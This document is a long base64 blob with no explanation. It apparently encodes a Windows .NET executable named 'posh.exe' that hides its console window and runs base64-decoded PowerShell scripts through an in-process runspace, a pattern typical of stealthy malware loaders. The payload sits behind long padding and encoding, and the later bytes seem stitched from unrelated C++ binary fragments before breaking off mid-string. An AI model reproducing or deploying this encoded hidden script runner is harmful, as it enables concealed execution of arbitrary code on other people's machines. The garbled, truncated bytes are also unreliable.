QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA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AAEDAEIAAQAAAQUAUwACAASAAAAAAAAAAAAAAAAAAAAAAPAAAAACAAAAAAAAAAAAAAABABsAAAAAAAEAAAAAAAAAAAAAAD0APwEAAAAAAAAAAAA8TW9kdWxlPgBwb3NoLmV4ZQBQcm9ncmFtAG1zY29ybGliAFN5c3RlbQBPYmplY3QAU1dfSElERQBTV19TSE9XAEdldENvbnNvbGVXaW5kb3cAU2hvd1dpbmRvdwAuY3RvcgBJbnZva2VBdXRvbWF0aW9uAFJ1blBTAE1haW4AaFduZABuQ21kU2hvdwBjbWQAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAHBvc2gAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAERsbEltcG9ydEF0dHJpYnV0ZQBrZXJuZWwzMi5kbGwAdXNlcjMyLmRsbABTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uAFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzAFJ1bnNwYWNlRmFjdG9yeQBSdW5zcGFjZQBDcmVhdGVSdW5zcGFjZQBPcGVuAFJ1bnNwYWNlSW52b2tlAFBpcGVsaW5lAENyZWF0ZVBpcGVsaW5lAENvbW1hbmRDb2xsZWN0aW9uAGdldF9Db21tYW5kcwBBZGRTY3JpcHQAU3lzdGVtLkNvbGxlY3Rpb25zLk9iamVjdE1vZGVsAENvbGxlY3Rpb25gMQBQU09iamVjdABJbnZva2UAQ2xvc2UAU3lzdGVtLlRleHQAU3RyaW5nQnVpbGRlcgBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBJRW51bWVyYXRvcmAxAEdldEVudW1lcmF0b3IAZ2V0X0N1cnJlbnQAQXBwZW5kAFN5c3RlbS5Db2xsZWN0aW9ucwBJRW51bWVyYXRvcgBNb3ZlTmV4dABJRGlzcG9zYWJsZQBEaXNwb3NlAFRvU3RyaW5nAFN0cmluZwBUcmltAEVuY29kaW5nAGdldF9Vbmljb2RlAENvbnZlcnQARnJvbUJhc2U2NFN0cmluZwBHZXRTdHJpbmcAAAAD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